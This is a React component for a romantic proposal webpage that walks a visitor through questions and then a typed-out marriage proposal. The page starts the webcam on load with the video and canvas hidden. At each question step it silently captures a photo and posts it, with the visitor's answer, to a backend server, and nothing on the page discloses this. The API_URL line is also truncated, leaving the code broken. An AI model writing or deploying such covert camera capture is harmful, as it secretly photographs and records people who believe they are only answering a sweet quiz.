import React, { useRef, useState, useEffect } from 'react';
import Header from './components/Header';
import QuestionContainer from './components/QuestionContainer';
import backgroundImages, { dpImage } from './backgroundImages';
import useQuestions from './hooks/useQuestions';

const API_URL = (import.meta.env.VITE_API_BASE_URL || "http:

const TypingEffect = ({ text }) => {
  const [displayText, setDisplayText] = useState('');
  const [index, setIndex] = useState(0);

  useEffect(() => {
    if (index < text.length) {
      const timeout = setTimeout(() => {
        setDisplayText(prev => prev + text[index]);
        setIndex(index + 1);
      }, 50);
      return () => clearTimeout(timeout);
    }
  }, [index, text]);

  return <p style={{ color: '#fff', lineHeight: '1.8', marginBottom: '15px' }}>{displayText}</p>;
};

const App = () => {
  const { questions, answers, handleAnswersChange } = useQuestions();
  const [step, setStep] = useState(1);
  const [capturedImages, setCapturedImages] = useState([]);
  const [showProposal, setShowProposal] = useState(false);
  const [userMessage, setUserMessage] = useState('');
  const [messageSubmitted, setMessageSubmitted] = useState(false);
  const [proposalResponse, setProposalResponse] = useState(null);
  const [finalUserMessage, setFinalUserMessage] = useState('');

  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  const proposalText = [
    "You’ve been on my mind every single day and night, filling my heart with feelings I’ve never known.",
    "You are the one who brings light to every moment—so I poured my thoughts into this webpage to show how much I care.",
    "I may stumble along the way, but I promise to always do my best. I hope we can share this wonderful adventure together.",
    "Will you say yes to this journey?"
  ].join(' ');

  useEffect(() => {
    const currentBackground =
      step <= backgroundImages.length
        ? backgroundImages[step - 1]
        : backgroundImages[backgroundImages.length - 1];

    document.body.style.backgroundImage = `url(${currentBackground})`;
    document.body.style.backgroundSize = 'cover';
    document.body.style.backgroundPosition = 'center';
    document.body.style.backgroundAttachment = 'fixed';
  }, [step]);

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      videoRef.current.srcObject = stream;
    } catch (error) {
      console.error('Error accessing the camera:', error);
    }
  };

  useEffect(() => {
    startCamera();
  }, []);

  const captureImage = () => {
    const canvas = canvasRef.current;
    const video = videoRef.current;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL('image/png');
    setCapturedImages(prev => [...prev, image]);
    return image;
  };

  const submitQuestionResponse = (currentImage) => {
    const currentQuestion = questions[step - 1];
    const answer = answers[currentQuestion.key];
    const data = {
      type: "question",
      step: step,
      question: currentQuestion.question,
      answer: answer,
      capturedImage: currentImage,
      timestamp: new Date()
    };
    fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    })
    .then(res => {
      if (!res.ok) {
        alert("Failed to submit question response");
      }
    })
    .catch(err => console.error("Error submitting question response:", err));
  };

  const handleNextStep = () => {
    const currentImage = captureImage();
    submitQuestionResponse(currentImage);
    setStep(step + 1);
  };

  const submitProposalResponse = (response) => {
    const data = {
      type: "proposal",
      proposalResponse: response,
      timestamp: new Date()
    };
    fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    })
    .then(res => {
      if (!res.ok) {
        alert("Failed to submit proposal response");
      }
    })
    .catch(err => console.error("Error submitting proposal response:", err));
  };

  const submitChatMessage = (message) => {
    const data = {
      type: "chat",
      message: message,
      timestamp: new Date()
    };
    fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    })
    .then(res => {
      if (!res.ok) {
        alert("Failed to submit chat message");
      }
    })
    .catch(err => console.error("Error submitting chat message:", err));
  };

  return (
    <div>
      {!showProposal ? (
        step <= questions.length ? (
          <>
            <video ref={videoRef} autoPlay style={{ display: 'none' }}></video>
            <canvas ref={canvasRef} style={{ display: 'none' }}></canvas>
            <QuestionContainer
              step={step}
              questions={questions}
              answers={answers}
              onNext={handleNextStep}
              onAnswerChange={handleAnswersChange}
            />
          </>
        ) : (
          <div style={{ textAlign: 'center', marginTop: '20%' }}>
            <img
              src={dpImage}
              alt="Display Picture"
              onClick={() => setShowProposal(true)}
              style={{
                borderRadius: '50%',
                cursor: 'pointer',
                width: '150px',
                height: '150px',
                boxShadow: '0 4px 10px rgba(0, 0, 0, 0.3)',
              }}
            />
            <p>Click on the DP to reveal the proposal!</p>
          </div>
        )
      ) : (
        <div
          style={{
            padding: '20px',
            margin: '0 auto',
            textAlign: 'center',
            backgroundColor: 'rgba(0, 0, 0, 0.8)',
            borderRadius: '10px',
            boxShadow: '0 4px 10px rgba(0, 0, 0, 0.5)',
            color: '#fff',
            maxWidth: '700px',
            maxHeight: '500px',
            overflowY: 'scroll',
            scrollbarWidth: 'none',
            msOverflowStyle: 'none',
          }}
        >
          <style>
            {`
              .container::-webkit-scrollbar {
                display: none;
              }
            `}
          </style>
          <h1 style={{ marginBottom: '15px' }}>Will You Be Mine Forever? 💍</h1>
          <TypingEffect text={proposalText} />
          <button
            onClick={() => {
              setProposalResponse("yes");
              submitProposalResponse("yes");
              alert("I'm so happy you said yes! 💖");
            }}
            style={{
              padding: '12px 25px',
              fontSize: '1.2rem',
              fontWeight: 'bold',
              color: '#fff',
              backgroundColor: '#ff6f91',
              border: 'none',
              borderRadius: '25px',
              cursor: 'pointer',
              margin: '10px',
              transition: 'background-color 0.3s ease, transform 0.2s ease',
            }}
          >
            Yes, I Do! 💕
          </button>
          <button
            onClick={() => {
              setProposalResponse("no");
              submitProposalResponse("no");
              alert("That’s okay! You’re still amazing. 😊");
            }}
            style={{
              padding: '12px 25px',
              fontSize: '1.2rem',
              fontWeight: 'bold',
              color: '#fff',
              backgroundColor: '#666',
              border: 'none',
              borderRadius: '25px',
              cursor: 'pointer',
              margin: '10px',
              transition: 'background-color 0.3s ease, transform 0.2s ease',
            }}
          >
            No, Thank You!
          </button>
          <div style={{ marginTop: '20px' }}>
            <h3 style={{ color: '#fff' }}>Share Your Thoughts 💌</h3>
            {!messageSubmitted ? (
              <>
                <textarea
                  rows="4"
                  placeholder="Write your message here..."
                  value={userMessage}
                  onChange={(e) => setUserMessage(e.target.value)}
                  style={{
                    width: '80%',
                    padding: '12px',
                    border: '2px solid #ff9a9e',
                    borderRadius: '10px',
                    backgroundColor: '#333',
                    color: '#fff',
                    boxShadow: '0 4px 8px rgba(0, 0, 0, 0.5)',
                  }}
                ></textarea>
                <br />
                <button
                  onClick={() => {
                    setFinalUserMessage(userMessage);
                    submitChatMessage(userMessage);
                    setMessageSubmitted(true);
                    setUserMessage('');
                  }}
                  style={{
                    marginTop: '10px',
                    padding: '10px 20px',
                    fontSize: '1.1rem',
                    color: '#fff',
                    backgroundColor: '#6fbae7',
                    border: 'none',
                    borderRadius: '10px',
                    cursor: 'pointer',
                  }}
                >
                  Submit
                </button>
              </>
            ) : (
              <p style={{ fontStyle: 'italic', color: '#fff' }}>
                Thank you for your message!
              </p>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default App;